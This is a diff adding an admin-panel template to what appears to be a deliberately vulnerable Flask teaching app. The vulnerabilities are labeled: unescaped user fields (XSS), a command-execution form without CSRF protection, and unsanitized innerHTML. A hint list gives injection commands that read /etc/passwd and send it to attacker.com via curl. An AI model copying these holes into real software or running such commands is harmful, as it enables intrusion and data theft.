@@ -1,0 +1,96 @@
+{% extends "base.html" %}
+
+{% block title %}Admin Panel{% endblock %}
+
+{% block content %}
+<div class="admin-container">
+    <h2>🔐 Admin Panel</h2>
+
+    <div class="admin-section">
+        <h3>Registered Users</h3>
+        <table class="users-table">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Email</th>
+                    <th>Admin</th>
+                    <th>Created</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for user in users %}
+                <tr>
+                    <td>{{ user.id }}</td>
+                    <!-- CWE-79: XSS vulnerability -->
+                    <td>{{ user.username|safe }}</td>
+                    <td>{{ user.email|safe }}</td>
+                    <td>{% if user.is_admin %}✓{% else %}✗{% endif %}</td>
+                    <td>{{ user.created_at }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+    <!-- CWE-78: OS Command Injection -->
+    <div class="admin-section dangerous">
+        <h3>⚠️ System Command Execution</h3>
+        <p class="warning">Extremely dangerous feature - demonstrates CWE-78</p>
+
+        <form id="commandForm">
+            <div class="form-group">
+                <input type="text"
+                       id="command"
+                       placeholder="Enter system command..."
+                       required>
+            </div>
+            <button type="submit">Execute Command</button>
+        </form>
+
+        <div id="commandOutput" class="command-output"></div>
+
+        <div class="vulnerability-hint">
+            <p><strong>Command Injection Examples:</strong></p>
+            <ul>
+                <li><code>ls -la</code> - List files</li>
+                <li><code>whoami</code> - Current user</li>
+                <li><code>cat /etc/passwd</code> - Read system files</li>
+                <li><code>ls; cat /etc/passwd</code> - Command chaining</li>
+                <li><code>ls && curl attacker.com/?data=$(cat /etc/passwd)</code> - Data exfiltration</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<script>
+// CWE-352: No CSRF protection
+// CWE-79: Potential DOM XSS
+document.getElementById('commandForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const command = document.getElementById('command').value;
+    const formData = new FormData();
+    formData.append('command', command);
+
+    fetch('{{ url_for("admin_execute_command") }}', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        const output = document.getElementById('commandOutput');
+        // VULNERABILITY: innerHTML with unsanitized content
+        if (data.output) {
+            output.innerHTML = '<pre>' + data.output + '</pre>';
+        } else if (data.error) {
+            output.innerHTML = '<div class="error">' + data.error + '</div>';
+        }
+    })
+    .catch(error => {
+        document.getElementById('commandOutput').innerHTML =
+            '<div class="error">Error: ' + error + '</div>';
+    });
+});
+</script>
+{% endblock %}
